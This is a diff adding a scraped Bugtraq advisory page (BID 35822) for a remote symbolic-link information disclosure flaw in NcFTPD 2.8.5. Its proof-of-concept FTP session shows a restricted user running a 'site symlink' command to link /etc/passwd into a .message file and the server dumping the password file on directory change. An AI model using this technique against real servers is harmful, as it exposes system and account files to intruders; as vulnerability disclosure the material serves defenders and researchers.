@@ -1,0 +1,95 @@
+#SpeeDr00t@Black Falcon<br>#bid35822<p><b><span style="font-size: 18pt;">NcFTPD Symbolic Link Information Disclosure Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/35822/info">info</a><br><a href="http://www.securityfocus.com/bid/35822/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/35822/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/35822/solution">solution</a><br><a href="http://www.securityfocus.com/bid/35822/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				35822
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Unknown
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Jul 27 2009 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jul 28 2009 10:35PM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Kingcope
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					NcFTP Software NcFTPD 2.8.5 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	The following proof of concept demonstrates this issue:<br/><br/># ftp 192.168.2.5<br/>Connected to 192.168.2.5.<br/>220 localhost NcFTPd Server (unregistered copy) ready.<br/>Name (192.168.2.5:root): kcope<br/>331 User kcope okay, need password.<br/>Password:<br/>230-You are user #1 of 50 simultaneous users allowed.<br/>230-<br/>230 Restricted user logged in.<br/>Remote system type is UNIX.<br/>Using binary mode to transfer files.<br/>local: passwd remote: /etc/passwd<br/>502 Unimplemented command.<br/>227 Entering Passive Mode (192,168,2,5,219,171)<br/>550 No such file.<br/>ftp&amp;gt; ls ..<br/>227 Entering Passive Mode (192,168,2,5,218,102)<br/>553 Permission denied.<br/>ftp&amp;gt; mkdir isowarez<br/>257 "/isowarez" directory created.<br/>ftp&amp;gt; quote site symlink /etc/passwd isowarez/.message<br/>250 Symlinked.<br/>ftp&amp;gt; cd isowarez<br/>250-"/isowarez" is new cwd.<br/>250-<br/>250-# $FreeBSD: src/etc/master.passwd,v 1.40 2005/06/06 20:19:56 brooks Exp $<br/>250-#<br/>250-root:*:0:0:Charlie &amp;amp;:/root:/bin/sh<br/>250-toor:*:0:0:Bourne-again Superuser:/root:<br/>250-daemon:*:1:1:Owner of many system processes:/root:/usr/sbin/nologin<br/>250-operator:*:2:5:System &amp;amp;:/:/usr/sbin/nologin<br/>250-bin:*:3:7:Binaries Commands and Source:/:/usr/sbin/nologin<br/>250-tty:*:4:65533:Tty Sandbox:/:/usr/sbin/nologin<br/>250-kmem:*:5:65533:KMem Sandbox:/:/usr/sbin/nologin<br/>250-games:*:7:13:Games pseudo-user:/usr/games:/usr/sbin/nologin<br/>250-news:*:8:8:News Subsystem:/:/usr/sbin/nologin<br/>250-man:*:9:9:Mister Man Pages:/usr/share/man:/usr/sbin/nologin<br/>250-sshd:*:22:22:Secure Shell Daemon:/var/empty:/usr/sbin/nologin<br/>250-smmsp:*:25:25:Sendmail Submission<br/>User:/var/spool/clientmqueue:/usr/sbin/nologin<br/>250-mailnull:*:26:26:Sendmail Default User:/var/spool/mqueue:/usr/sbin/nologin<br/>250-bind:*:53:53:Bind Sandbox:/:/usr/sbin/nologin<br/>250-proxy:*:62:62:Packet Filter pseudo-user:/nonexistent:/usr/sbin/nologin<br/>250-_pflogd:*:64:64:pflogd privsep user:/var/empty:/usr/sbin/nologin<br/>250-_dhcp:*:65:65:dhcp programs:/var/empty:/usr/sbin/nologin<br/>250-uucp:*:66:66:UUCP<br/>pseudo-user:/var/spool/uucppublic:/usr/local/libexec/uucp/uucico<br/>250-pop:*:68:6:Post Office Owner:/nonexistent:/usr/sbin/nologin<br/>250-www:*:80:80:World Wide Web Owner:/nonexistent:/usr/sbin/nologin<br/>250-nobody:*:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin<br/>250-kcope:*:1001:1001:User kcope:/home/kcope:/bin/csh<br/>250-messagebus:*:556:556:D-BUS Daemon User:/nonexistent:/sbin/nologin<br/>250-polkit:*:562:562:PolicyKit Daemon User:/nonexistent:/sbin/nologin<br/>250-haldaemon:*:560:560:HAL Daemon User:/nonexistent:/sbin/nologin<br/>250-ftp:*:1002:14:User &amp;amp;:/home/ftp:/bin/sh<br/>250-cyrus:*:60:60:the cyrus mail server:/usr/local/cyrus:/bin/csh<br/>250-postfix:*:125:125:Postfix Mail System:/var/spool/postfix:/usr/sbin/nologin<br/>250-test:*:1003:1003:test:/home/test:/bin/sh<br/>250-+testx:*:::::/bin/sh<br/>250<br/>ftp&amp;gt;
+	
+		<ul>
+</ul>
+</div>
